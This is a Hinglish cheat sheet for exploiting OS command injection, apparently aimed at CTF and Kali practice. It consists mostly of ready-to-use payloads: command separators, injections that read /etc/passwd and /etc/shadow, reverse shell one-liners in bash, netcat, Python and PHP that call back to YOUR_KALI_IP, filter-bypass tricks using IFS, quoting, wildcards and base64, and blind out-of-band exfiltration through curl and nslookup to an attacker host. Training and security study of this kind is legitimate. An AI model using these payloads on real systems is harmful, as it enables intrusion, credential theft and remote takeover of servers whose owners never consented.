# COMMAND INJECTION — OS Commands Execute Karo

---

## Pehle Samjho: Command Injection Kya Hai?

Socho ek web page hai jahan tum IP address daalte ho aur wo ping karta hai.
Backend mein ye chalta hai:
```bash
ping -c 4 TUMHARA_INPUT
```
Tum input mein daal do: `8.8.8.8; whoami`
Ab backend pe ye chalega:
```bash
ping -c 4 8.8.8.8; whoami
```
`;` ke baad `whoami` bhi execute ho gaya! Tumne OS command inject kar diya.

**Kab hota hai?** Jab application user input ko directly system command mein daalti hai — jaise ping, nslookup, traceroute tools wale pages.

**Kahan dhundho?**
- IP address input fields
- "Ping this host" type tools
- DNS lookup pages
- File name input (convert, process type operations)
- Any page jo system command execute karti dikhti hai

---

## Command Separators — Ye Sab Try Karo

Har separator alag tarike se kaam karta hai:

| Separator | Kaise Kaam Karta Hai | Example |
|---|---|---|
| `;` | Pehla command ho ya fail — doosra chalega | `8.8.8.8; whoami` |
| `\|` | Pehle ka output doosre ko pipe karo | `8.8.8.8 \| whoami` |
| `\|\|` | Pehla FAIL ho toh doosra chale | `fake \|\| whoami` |
| `&&` | Pehla SUCCESS ho toh doosra chale | `8.8.8.8 && whoami` |
| `` `command` `` | Backticks — command substitute | `` `whoami` `` |
| `$(command)` | Command substitution (modern) | `$(whoami)` |
| `\n` | Newline (URL encoded: %0a) | `8.8.8.8%0awhoami` |

**Strategy:** Pehle `;` try karo. Block ho? `|` try karo. Wo bhi? `$(...)` try karo. Sab try karo ek ek karke!

---

## CASE 1: Basic Injection — Pehle Confirm Karo

```bash
# Input field mein ye daal ke submit karo:
; whoami
| whoami
`whoami`
$(whoami)
& whoami
&& whoami
|| whoami
```

**Output kya expect karo:**
- `whoami` ka output dikhega page pe (jaise `www-data` ya `root`)
- Agar kuch nahi dikhe toh BLIND injection ho sakta hai — CASE 5 dekho

**Pehle whoami kyun?** Kyunki ye chhota command hai, fast hai, aur agar dikhta hai toh confirm ho jaata hai ki injection work kar raha hai.

---

## CASE 2: Linux — Information Gathering / Flag Dhundho

```bash
# System info
; id                                         # user id + groups
; whoami                                     # current user
; uname -a                                   # OS info
; hostname                                   # machine name

# Files padho
; cat /etc/passwd                            # all users
; cat /etc/shadow                            # password hashes (root chahiye)
; cat /root/flag.txt                         # CTF flag common location
; cat /home/user/flag.txt                    # user flag

# Flag dhundho agar path nahi pata
; find / -name "flag*" 2>/dev/null           # flag files search
; find / -name "*.txt" 2>/dev/null           # all txt files
; ls -la /root/                              # root directory listing
; ls -la /home/                              # home directories
```

**`2>/dev/null` kya hai?** Error messages suppress karta hai taaki sirf useful output dikhe.

---

## CASE 3: Reverse Shell — Proper Access Lo

**Step 1:** Apne Kali pe listener start karo:
```bash
nc -lvnp 4444
```

**Step 2:** Injection point pe ye daal ke try karo (ek ek karke):
```bash
# Bash reverse shell (sabse common)
; bash -c 'bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1'

# Netcat reverse shell
; nc YOUR_KALI_IP 4444 -e /bin/bash
# Agar -e support nahi hai:
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc YOUR_KALI_IP 4444 >/tmp/f

# Python reverse shell
; python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_KALI_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Python3 version
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_KALI_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PHP reverse shell
; php -r '$sock=fsockopen("YOUR_KALI_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

**Output kya expect karo listener pe:**
```
connect to [YOUR_IP] from (UNKNOWN) [TARGET_IP]
bash-5.0$
```
Ab tum target machine pe ho!

---

## CASE 4: Filter Bypass — Jab Basic Payloads Block Ho

```bash
# CASE 4a: SPACE blocked hai
;{whoami}                                    # brace trick
;${IFS}whoami                                # $IFS = Internal Field Separator = space
;cat${IFS}/etc/passwd                        # IFS for spaces in commands
;cat$IFS/etc/passwd                          # without braces bhi chalega
;cat</etc/passwd                             # input redirection
;{cat,/etc/passwd}                           # comma separated in braces

# CASE 4b: Keywords blocked (cat, whoami etc.)
;w'h'o'am'i                                 # quotes ke andar break karo
;w"h"o"am"i                                 # double quotes bhi chalega
;/bin/wh?ami                                 # wildcard ? = any single char
;/bin/w*                                     # wildcard * = whoami
;cat /etc/pas??d                             # passwd ka wildcard
;$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)   # base64 encode karke execute

# CASE 4c: Common characters blocked
;%0awhoami                                   # newline (URL encoded)
```

**Bypass strategy:**
1. Space blocked? → `${IFS}` use karo
2. Command name blocked? → quotes insert karo (`w'h'o'am'i`)
3. Path blocked? → wildcards use karo (`/bin/w*`)
4. Sab blocked? → Base64 encode karo

---

## CASE 5: Windows Command Injection

```bash
# Windows separators
& whoami
| whoami
&& whoami
|| whoami

# Windows info gathering
& whoami
& hostname
& ipconfig
& net user
& net localgroup administrators
& type C:\flag.txt
& type C:\Users\Administrator\Desktop\flag.txt
& dir C:\Users\Administrator\Desktop\

# Windows flag dhundho
& dir /s /b C:\flag*.txt
& dir /s /b C:\Users\*.txt
```

**Linux vs Windows kaise pehchano?**
- `;` kaam kare = probably Linux
- `&` kaam kare lekin `;` nahi = probably Windows
- `whoami` dono mein kaam karta hai
- Path style: `/etc/passwd` vs `C:\Users\`

---

## CASE 6: Blind Command Injection

Jab output page pe nahi dikhta toh:

```bash
# Time-based detection — agar response slow ho = injectable
; sleep 5                                    # 5 second delay aaya?
& ping -c 5 127.0.0.1                       # 5 second delay?

# Out-of-band — apne server pe data bhejo
; whoami | curl http://YOUR_IP:8888/?data=$(whoami)
; curl http://YOUR_IP:8888/$(cat /etc/hostname)
; nslookup $(whoami).YOUR_DOMAIN

# File mein likhke phir padho
; whoami > /var/www/html/output.txt
# Phir browser mein: http://target.com/output.txt
```

---

## Common Mistakes (Mat Karna Ye)

1. **Sirf ek separator try kiya:** Har separator try karo — ek block ho sakta hai doosra nahi
2. **YOUR_IP replace nahi kiya:** Reverse shell mein apna Kali IP daalba bhool gaye!
3. **Listener start nahi kiya:** Reverse shell se pehle `nc -lvnp 4444` zaruri hai
4. **Linux commands Windows pe:** `cat` Windows mein nahi hota — `type` use karo
5. **Space filter miss kiya:** Agar command nahi chal raha aur separator kaam kar raha hai toh space blocked ho sakta hai
6. **URL encoding bhool gaye:** Browser se test kar rahe ho toh `<`, `>`, `|` ko URL encode karo

---

## Quick Decision Tree

```
Command injection suspect?
  │
  ├─ Input field hai (ping/lookup/tool)?
  │    └─ ; whoami try karo → output dikha? CONFIRMED!
  │
  ├─ ; se kaam nahi chala?
  │    └─ | try karo → || → && → $() → `` (sab try karo)
  │
  ├─ Output nahi dikhta (blind)?
  │    ├─ ; sleep 5 → delay aaya? = injectable
  │    └─ curl/nslookup se apne server pe data bhejo
  │
  ├─ Linux hai?
  │    ├─ cat /etc/passwd, find / -name flag*
  │    └─ Reverse shell: bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
  │
  ├─ Windows hai?
  │    ├─ type C:\flag.txt, dir, net user
  │    └─ & separator prefer karo
  │
  └─ Filter bypass chahiye?
       ├─ Space blocked → ${IFS}
       ├─ Command blocked → w'h'o'am'i
       └─ Path blocked → /bin/w*
```
